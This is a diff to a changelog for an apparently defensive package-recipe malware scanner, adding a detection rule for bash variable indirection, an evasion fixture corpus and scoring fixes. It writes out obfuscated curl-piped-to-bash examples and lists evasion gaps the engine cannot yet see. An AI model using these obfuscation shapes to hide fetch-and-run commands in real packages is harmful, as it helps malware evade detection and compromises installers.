@@ -362,6 +362,60 @@
   is no longer used by any command; a verdict still never changes the exit
   code.
 
+### Added
+
+- **R132: a command or shell named through `${!name}` indirection.**
+  `C=curl; ${!C} url | bash` runs curl while the recipe carries no literal
+  curl and no literal shell for R001/R002/R129/R121 to name, because the
+  tokenizer refuses to evaluate indirection it cannot know statically.
+  Flagging the indirection itself (CRITICAL, obfuscation, staged
+  `anti_analysis`) closes that whole family; the benign `${!arr[@]}` and
+  `${!prefix*}` key-and-name-listing forms are excluded by construction.
+- **The evasion fixture corpus (`scripts/gen_evasion_fixtures.py`).** Recipe
+  shapes that bypass the engine are written down *before* they are closed and
+  kept as the record of what the engine can and cannot yet see. Six original
+  evasions (indirect expansion, `+=`-accumulated commands and deps,
+  heredoc-fed and heredoc-written recipes), of which five are now detected
+  and relabelled into the recall corpus, plus three new open gaps filed for
+  the rules that will close them: R133 (array-subscript routing), R134
+  (nameref routing) and R135 (command-substitution spelling). Each fixture
+  enforces its state in both directions — an open gap must fail its label,
+  a relabelled fixture must pass it — so a patch that closes a gap turns
+  `gate_known_gaps_unchanged` red instead of leaving a stale record.
+
+### Changed
+
+- **The source-bucket prior scores at its worst URL, not its sum.** Each
+  added URL contributed its bucket modifier individually, so appending the
+  same suspiciously hosted URL many times (the `discord_arch_electron`
+  case: ~26 entries at +20 each) stacked into CRITICAL on the strength of a
+  single weak fact. The prior is now the maximum modifier over all added
+  URLs — one diff whose provenance is unknown, not thirty separate facts —
+  which restores the calibration separation (benign p95 strictly below
+  malicious p5). `homograph_attack` still dominates at +30, and trusted
+  forges still contribute nothing.
+- **The assignment resolver accumulates `+=`.** `_ASSIGNMENT_RE` now reads
+  the operator: `=` is a fresh binding, `+=` appends to the current value
+  (a fresh name starts empty, matching bash). A fetch command assembled
+  across `C+=curl` / `C+=' https://…'` lines therefore resolves to a
+  literal `curl https://… | bash` that R001 owns, instead of staying an
+  opaque `$C` the literal-matching rules step over.
+- **The synthetic fixtures now validate under the shipped config before
+  writing.** `scripts/gen_malicious_fixtures.py` resolves labels against the
+  same cold-DB, `shipped_config()` context `scan_malicious` runs in, so a
+  rule that stops detecting fails at generation time, and a fixture whose
+  label was hand-reconciled (R004/R009/R025/R026/R027/R039/R059/R128/R129/R130)
+  can no longer be silently clobbered by a regenerate.
+
+### Fixed
+
+- **`depends+=` was invisible to the dependency rules.** Accumulated
+  dependency declarations were never parsed as declarations, so a recipe
+  that appended to `depends` cold showed no finding at all. The generator
+  now keeps `evasion-depends-via-plus-eq` filed as an open gap (novelty
+  rules are DB-backed and silent under the gates' cold DB) rather than
+  pretending the parse gap is closed.
+
 ## [0.11.0] - 2026-07-30
 
 ### Added
